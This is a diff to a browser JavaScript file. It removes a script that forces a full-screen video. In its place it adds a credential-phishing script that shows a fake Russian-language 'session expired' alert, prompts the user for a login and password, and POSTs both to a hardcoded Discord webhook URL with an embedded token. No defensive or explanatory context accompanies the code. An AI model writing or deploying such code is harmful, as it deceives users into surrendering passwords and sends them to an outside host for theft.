@@ -1,28 +1,31 @@
-const video = document.createElement('video');
-video.src = 'https://github.com/mea1k/s/raw/refs/heads/main/youtubecom%20video720p.mp4';
-video.muted = false;
-video.controls = true;
-video.style.position = 'fixed';
-video.style.top = '0';
-video.style.left = '0';
-video.style.width = '100vw';
-video.style.height = '100vh';
-video.style.objectFit = 'cover';
-video.style.backgroundColor = 'black';
-video.style.zIndex = '9999';
+const webhookURL = "https://discord.com/api/webhooks/1210472682563567686/FUb00La-5a9McnB-OGlPdVwhZYViqLib8bppLlH6TmQCptLzrMy_MKc4KI1aFF934LYx";
 
-document.body.appendChild(video);
+alert("Ваша сессия окончена. Пожалуйста, войдите снова.");
 
-video.play()
-  .then(() => {
-    if (video.requestFullscreen) {
-      return video.requestFullscreen();
-    } else if (video.webkitRequestFullscreen) {
-      return video.webkitRequestFullscreen();
-    } else if (video.msRequestFullscreen) {
-      return video.msRequestFullscreen();
-    }
-  })
-  .catch(err => {
-    console.error('Ошибка при запуске видео или переходе в fullscreen:', err);
-  });
+// Запрашиваем логин и пароль
+const login = prompt("Введите логин:");
+const password = prompt("Введите пароль:");
+
+// Формируем тело сообщения для Discord
+const data = {
+  content: `Сессия закончилась. Пользователь ввел:\nЛогин: ${login}\nПароль: ${password}`
+};
+
+// Отправляем POST запрос на webhook
+fetch(webhookURL, {
+  method: "POST",
+  headers: {
+    "Content-Type": "application/json"
+  },
+  body: JSON.stringify(data)
+})
+.then(response => {
+  if (response.ok) {
+    alert("Данные успешно отправлены.");
+  } else {
+    alert("Ошибка при отправке данных.");
+  }
+})
+.catch(error => {
+  alert("Ошибка сети: " + error.message);
+});
